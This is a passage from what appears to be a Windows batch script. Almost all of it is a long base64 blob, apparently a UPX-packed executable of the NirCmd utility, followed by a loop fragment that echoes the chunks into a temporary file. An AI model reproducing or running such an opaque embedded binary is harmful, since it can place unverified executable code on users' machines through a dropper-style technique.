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"
    ) do (
        echo %%~a >> "!filePath!.tmp"
